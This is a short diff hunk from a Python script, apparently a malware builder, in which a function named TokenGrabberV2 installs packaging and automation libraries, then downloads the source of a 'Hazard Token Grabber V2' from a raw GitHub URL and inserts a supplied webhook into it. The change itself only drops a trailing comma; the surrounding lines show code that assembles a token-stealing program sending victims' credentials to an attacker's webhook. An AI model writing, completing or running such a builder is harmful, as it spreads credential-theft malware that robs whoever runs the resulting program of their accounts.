@@ -26,7 +26,7 @@ def TokenGrabberV2(WebHook, fileName):
         'pycryptodome',
         'pyinstaller',
         'pyautogui',
-        'PIL-tools',
+        'PIL-tools'
     ]
     install_lib(required)
     code = requests.get("https://raw.githubusercontent.com/JaneHongEn/111/main/Hazard-Token-Grabber-V2-main").text.replace("WEBHOOK_HERE", WebHook)
